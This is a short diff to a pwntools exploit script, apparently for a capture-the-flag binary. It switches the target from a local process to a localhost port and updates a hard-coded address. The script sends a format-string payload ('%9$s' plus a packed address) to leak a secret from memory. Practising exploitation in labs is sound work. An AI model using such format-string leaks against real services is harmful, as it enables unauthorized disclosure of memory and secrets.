@@ -2,8 +2,9 @@
 from pwn import *
 
 context.log_level='debug'
-p=process("./ef")
-secret_addr=0x404070
+# p=process("./ef")
+p=remote('localhost',9997)
+secret_addr=0x4040B0
 
 payload=b"%9$saaaa"+p64(secret_addr)
 p.recvuntil("address:")
